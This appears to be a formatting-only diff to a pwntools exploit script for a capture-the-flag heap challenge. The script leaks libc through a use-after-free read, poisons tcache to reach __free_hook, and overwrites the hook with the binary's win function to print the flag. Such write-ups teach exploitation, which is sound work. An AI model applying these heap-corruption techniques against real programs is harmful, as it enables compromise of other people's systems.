@@ -38,8 +38,10 @@ def start():
     # it at the sibling libc.so.6, so no patchelf is required.
     binpath = os.path.join(HANDOUT, "chall")
     ld = os.path.join(HANDOUT, "ld-2.31.so")
-    return process([ld, binpath], env={"LD_LIBRARY_PATH": HANDOUT,
-                                       "FLAG": os.environ.get("FLAG", "")})
+    return process(
+        [ld, binpath],
+        env={"LD_LIBRARY_PATH": HANDOUT, "FLAG": os.environ.get("FLAG", "")},
+    )
 
 
 io = start()
@@ -81,8 +83,8 @@ def view(idx):
 
 
 # --- 1. libc leak via UAF read of an unsorted-bin chunk -------------------
-alloc(0, 0x500)   # too big for tcache/fastbin -> unsorted bin on free
-alloc(1, 0x20)    # guard so chunk 0 is not consolidated into top
+alloc(0, 0x500)  # too big for tcache/fastbin -> unsorted bin on free
+alloc(1, 0x20)  # guard so chunk 0 is not consolidated into top
 free(0)
 
 leaked = u64(view(0)[:8].ljust(8, b"\x00"))
@@ -100,20 +102,20 @@ win = exe.sym["win"]
 log.info("__free_hook = %#x   win = %#x", free_hook, win)
 
 # --- 2. tcache poisoning via edit-after-free ------------------------------
-alloc(2, 0x18)    # chunk size 0x20, tcache index 0
+alloc(2, 0x18)  # chunk size 0x20, tcache index 0
 alloc(3, 0x18)
 free(2)
-free(3)           # tcache[0x20]: head=3 -> 2   (count=2)
+free(3)  # tcache[0x20]: head=3 -> 2   (count=2)
 
 # Edit-after-free: rewrite the freed head's fd to &__free_hook.
 edit(3, p64(free_hook).ljust(0x18, b"\x00"))
 
-alloc(4, 0x18)    # returns chunk 3; tcache head becomes __free_hook
-alloc(5, 0x18)    # returns a chunk whose user data == __free_hook
+alloc(4, 0x18)  # returns chunk 3; tcache head becomes __free_hook
+alloc(5, 0x18)  # returns a chunk whose user data == __free_hook
 
 # --- 3. write win into __free_hook and trigger ----------------------------
 edit(5, p64(win).ljust(0x18, b"\x00"))
-free(1)           # free() -> __free_hook(ptr) == win() -> prints flag
+free(1)  # free() -> __free_hook(ptr) == win() -> prints flag
 
 io.recvuntil(b"flag: ")
 flag = io.recvline(drop=True).decode(errors="replace").strip()
